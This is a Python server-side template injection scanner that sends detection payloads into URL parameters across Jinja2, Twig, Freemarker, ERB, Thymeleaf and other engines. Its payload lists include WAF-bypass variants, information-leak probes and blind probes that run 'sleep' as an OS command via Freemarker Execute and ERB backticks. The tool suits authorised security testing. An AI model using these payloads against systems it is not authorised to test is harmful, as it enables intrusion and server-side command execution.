#!/usr/bin/env python3
"""
ssti_scanner.py — Server-Side Template Injection (SSTI) scanner.

Tests URL parameters for template injection across Jinja2, Twig, Freemarker,
ERB, Spring EL, Thymeleaf, EJS, Pug, Handlebars, Mako, and generic engines.
Includes WAF bypass variants and blind/time-based probes.

Usage:
  python3 tools/ssti_scanner.py --target https://app.example.com/search
  python3 tools/ssti_scanner.py --target https://app.example.com/ --param q name
  python3 tools/ssti_scanner.py --target https://app.example.com/ --rate 0.5 --json
  python3 tools/ssti_scanner.py --target https://app.example.com/ --dry-run
"""

import argparse
import json
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

# ─── Color codes ──────────────────────────────────────────────────────────────
RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
CYAN   = "\033[96m"
BLUE   = "\033[94m"
BOLD   = "\033[1m"
DIM    = "\033[2m"
RESET  = "\033[0m"

FINDINGS = []

# Minimum response delay (seconds) to flag as a blind SSTI time-based finding
BLIND_DELAY_THRESHOLD = 3.5

# ─── Payloads ─────────────────────────────────────────────────────────────────

# Universal detection — result of 7*7 == 49 detected in response
UNIVERSAL_PAYLOADS = [
    ("{{7*7}}",         "Jinja2/Twig/generic double-brace"),
    ("${7*7}",          "Spring EL / Freemarker / EJS"),
    ("<%= 7*7 %>",      "ERB / EJS scriptlet"),
    ("#{7*7}",          "Ruby Liquid / Thymeleaf"),
    ("{7*7}",           "Smarty / Mako single-brace"),
    ("${{7*7}}",        "Thymeleaf inline expression"),
]

# Engine-specific payloads (all expected to evaluate to '49')
ENGINE_PAYLOADS = [
    # Jinja2
    ("{{7*'7'}}",                   "jinja2",       "7777777"),   # Jinja2 string repeat
    ("{{config}}",                  "jinja2",       ""),           # info leak, no numeric result
    ("{{self.__dict__}}",           "jinja2",       ""),
    # Twig
    ("{{7*7}}",                     "twig",         "49"),
    ("{{_self.env}}",               "twig",         ""),
    # Freemarker
    ("${7*7}",                      "freemarker",   "49"),
    ("<#assign x=7*7>${x}",         "freemarker",   "49"),
    # ERB
    ("<%= 7 * 7 %>",                "erb",          "49"),
    # Spring EL
    ("${7*7}",                      "spring-el",    "49"),
    ("*{7*7}",                      "spring-el",    "49"),
    # Thymeleaf
    ("${{7*7}}",                    "thymeleaf",    "49"),
    # EJS
    ("<%= 7*7 %>",                  "ejs",          "49"),
    # Pug
    ("#{7*7}",                      "pug",          "49"),
    # Handlebars (no arithmetic, probe for template rendering tell)
    ("{{this}}",                    "handlebars",   ""),
    # Mako
    ("${7*7}",                      "mako",         "49"),
    ("<%! x = 7*7 %>${x}",         "mako",         "49"),
]

# WAF bypass variants for the core {{7*7}} probe
WAF_BYPASS_PAYLOADS = [
    ("%7b%7b7*7%7d%7d",            "url-encoded braces"),
    ("%7B%7B7*7%7D%7D",            "URL-encoded braces uppercase"),
    ("{{7*7}}",                    "raw (baseline)"),
    ("{{'7'*7}}",                  "string multiply (Jinja2 alt)"),
    ("{{7|int*7}}",                "Jinja2 filter bypass"),
    ("%7b%7b7%2a7%7d%7d",          "full url-encoding with %2a for *"),
    ("{{7\u202f*\u202f7}}",        "unicode whitespace around operator"),
    ("{# comment #}{{7*7}}",       "prepend Jinja2 comment"),
    ("{% set x=7*7 %}{{x}}",       "Jinja2 set-then-render"),
]

# Blind / time-based probes — look for noticeable delay (>= 4 s)
BLIND_PAYLOADS = [
    ("{{range(1000000)|list}}",    "jinja2-blind",   "Jinja2 CPU exhaustion"),
    ("${\"freemarker.template.utility.Execute\"?new()(\"sleep 3\")}",
     "freemarker-blind", "Freemarker sleep"),
    ("<%= `sleep 3` %>",           "erb-blind",      "ERB backtick sleep"),
]

# Parameters to inject into
DEFAULT_PARAMS = ["q", "search", "query", "name", "id", "input", "data",
                  "text", "message", "template", "page", "view", "lang",
                  "content", "subject", "title", "body", "comment"]

RESULT_MARKER = "49"


# ─── HTTP Helpers ─────────────────────────────────────────────────────────────

def http_get(url: str, headers: dict | None = None,
              follow_redirects: bool = False,
              timeout: int = 10) -> tuple[int, dict, str]:
    req_headers = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}
    if headers:
        req_headers.update(headers)

    opener = urllib.request.build_opener()
    if not follow_redirects:
        opener = urllib.request.build_opener(urllib.request.HTTPRedirectHandler())

    req = urllib.request.Request(url, headers=req_headers)
    try:
        with opener.open(req, timeout=timeout) as r:
            body = r.read().decode(errors="replace")
            resp_headers = {}
            for k in r.headers:
                resp_headers[k.lower()] = r.headers[k]
            return r.status, resp_headers, body
    except urllib.error.HTTPError as e:
        body = e.read().decode(errors="replace")
        resp_headers = {}
        for k in e.headers:
            resp_headers[k.lower()] = e.headers[k]
        return e.code, resp_headers, body
    except Exception as e:
        return 0, {}, str(e)


def record(test: str, result: str, detail: str, severity: str = "MEDIUM"):
    FINDINGS.append({"test": test, "result": result, "detail": detail, "severity": severity})
    color = RED if result == "VULNERABLE" else (YELLOW if result == "INTERESTING" else GREEN)
    print(f"  {color}[{result}]{RESET} {test}")
    if detail:
        print(f"    {DIM}{detail}{RESET}")


def _inject_param(url: str, param: str, payload: str) -> str:
    """Return URL with param set to payload, appending to existing query string."""
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [payload]
    new_query = urllib.parse.urlencode(qs, doseq=True)
    return urllib.parse.urlunparse(parsed._replace(query=new_query))


# ─── Test Cases ───────────────────────────────────────────────────────────────

def test_universal_detection(url: str, params: list[str], rate: float, dry_run: bool):
    print(f"\n{BOLD}[1] Universal Detection Payloads{RESET}")
    for param in params:
        for payload, desc in UNIVERSAL_PAYLOADS:
            test_url = _inject_param(url, param, payload)
            if dry_run:
                print(f"  {CYAN}[DRY-RUN]{RESET} param={param} payload={payload!r}")
                print(f"    {DIM}URL: {test_url[:120]}{RESET}")
                continue
            time.sleep(1.0 / rate)
            status, headers, body = http_get(test_url)
            if RESULT_MARKER in body:
                record(f"ssti-universal-{param}", "VULNERABLE",
                       f"param={param}, payload={payload!r} ({desc}) → '49' in response",
                       "HIGH")
                return  # One hit per param set is sufficient
    if not dry_run:
        print(f"  {DIM}No universal SSTI detected across {len(params)} param(s){RESET}")


def test_engine_specific(url: str, params: list[str], rate: float, dry_run: bool):
    print(f"\n{BOLD}[2] Engine-Specific Payloads{RESET}")
    for param in params[:3]:  # Limit to top 3 params to stay rate-friendly
        for payload, engine, expected in ENGINE_PAYLOADS:
            test_url = _inject_param(url, param, payload)
            if dry_run:
                print(f"  {CYAN}[DRY-RUN]{RESET} [{engine}] param={param} payload={payload!r}")
                continue
            time.sleep(1.0 / rate)
            status, headers, body = http_get(test_url)
            if expected and expected in body:
                record(f"ssti-{engine}-{param}", "VULNERABLE",
                       f"Engine={engine}, param={param}, payload={payload!r} → '{expected}' found",
                       "HIGH")
            elif not expected and status not in (0, 404, 500):
                # Info-leak payloads: flag if response changed significantly
                if len(body) > 200 and any(k in body for k in ["__class__", "Environment", "config"]):
                    record(f"ssti-{engine}-info-{param}", "INTERESTING",
                           f"Engine={engine}, potential info leak via {payload!r}", "MEDIUM")
    if not dry_run:
        print(f"  {DIM}Engine-specific sweep complete{RESET}")


def test_waf_bypass(url: str, params: list[str], rate: float, dry_run: bool):
    print(f"\n{BOLD}[3] WAF Bypass Variants{RESET}")
    for param in params[:2]:
        for payload, desc in WAF_BYPASS_PAYLOADS:
            test_url = _inject_param(url, param, payload)
            if dry_run:
                print(f"  {CYAN}[DRY-RUN]{RESET} [{desc}] param={param} payload={payload!r}")
                continue
            time.sleep(1.0 / rate)
            status, headers, body = http_get(test_url)
            if RESULT_MARKER in body:
                record(f"ssti-waf-bypass-{param}", "VULNERABLE",
                       f"WAF bypass worked: {desc}, payload={payload!r}", "HIGH")
                return
    if not dry_run:
        print(f"  {DIM}No WAF bypass triggered{RESET}")


def test_blind_time_based(url: str, params: list[str], rate: float, dry_run: bool):
    print(f"\n{BOLD}[4] Blind / Time-Based Probes{RESET}")
    for param in params[:2]:
        for payload, label, desc in BLIND_PAYLOADS:
            test_url = _inject_param(url, param, payload)
            if dry_run:
                print(f"  {CYAN}[DRY-RUN]{RESET} [{label}] param={param} — {desc}")
                continue
            time.sleep(1.0 / rate)
            t0 = time.monotonic()
            status, _, _ = http_get(test_url, timeout=15)
            elapsed = time.monotonic() - t0
            if status == 0:
                # Network error / timeout — cannot draw conclusions
                record(f"ssti-blind-{label}-{param}", "ERROR",
                       f"Request failed (no response) for {label} on param={param}")
            elif elapsed >= BLIND_DELAY_THRESHOLD:
                record(f"ssti-blind-{label}-{param}", "VULNERABLE",
                       f"Response delayed {elapsed:.1f}s ≥ {BLIND_DELAY_THRESHOLD}s "
                       f"({desc}) param={param}", "HIGH")
            else:
                record(f"ssti-blind-{label}-{param}", "SAFE",
                       f"Response time {elapsed:.1f}s — no delay detected (HTTP {status})")


def print_payload_table():
    print(f"\n{BOLD}SSTI Payload Reference:{RESET}")
    for payload, desc in UNIVERSAL_PAYLOADS:
        print(f"  {DIM}{payload:35s} {desc}{RESET}")


# ─── Main ─────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="Server-Side Template Injection (SSTI) scanner")
    target_group = parser.add_mutually_exclusive_group(required=True)
    target_group.add_argument("--target", metavar="URL", help="Target URL to test")
    target_group.add_argument("--url",    metavar="URL", help="Alias for --target")
    parser.add_argument("--url-list", metavar="FILE",
                        help="File of URLs to test (one per line)")
    parser.add_argument("--param",   nargs="+", metavar="PARAM",
                        help="Parameter name(s) to inject (default: common list)")
    parser.add_argument("--rate",    type=float, default=1.0, metavar="REQ/S",
                        help="Request rate limit in req/sec (default: 1.0)")
    parser.add_argument("--dry-run", action="store_true",
                        help="Show payloads without sending requests")
    parser.add_argument("--json",    action="store_true", dest="json_output",
                        help="Output results as JSON")
    args = parser.parse_args()

    target = args.target or args.url
    params = args.param if args.param else DEFAULT_PARAMS

    targets = [target]
    if args.url_list:
        try:
            with open(args.url_list) as fh:
                for line in fh:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        targets.append(line)
        except OSError as e:
            print(f"{RED}[ERROR]{RESET} Cannot read --url-list: {e}", file=sys.stderr)
            sys.exit(1)

    for url in targets:
        print(f"\n{BOLD}{BLUE}╔══════════════════════════════════════╗")
        print(f"║   SSTI Scanner                       ║")
        print(f"╚══════════════════════════════════════╝{RESET}")
        print(f"  Target : {CYAN}{url}{RESET}")
        print(f"  Params : {', '.join(params[:8])}{'...' if len(params) > 8 else ''}")
        print(f"  Rate   : {args.rate} req/sec")
        if args.dry_run:
            print(f"  Mode   : {YELLOW}DRY-RUN (no requests sent){RESET}")

        print_payload_table()

        test_universal_detection(url, params, args.rate, args.dry_run)
        test_engine_specific(url, params, args.rate, args.dry_run)
        test_waf_bypass(url, params, args.rate, args.dry_run)
        test_blind_time_based(url, params, args.rate, args.dry_run)

    vulns = [f for f in FINDINGS if f["result"] == "VULNERABLE"]
    print(f"\n{BOLD}{'─'*50}{RESET}")
    print(f"  Tests run  : {len(FINDINGS)}")
    if vulns:
        print(f"  {RED}Vulnerable : {len(vulns)}{RESET}")
        for f in vulns:
            sev = f.get("severity", "")
            print(f"    {RED}→{RESET} [{sev}] {f['test']}: {f['detail']}")
    else:
        print(f"  {GREEN}Vulnerable : 0{RESET}")

    if args.json_output:
        print(json.dumps({"targets": targets, "findings": FINDINGS}, indent=2))


if __name__ == "__main__":
    main()
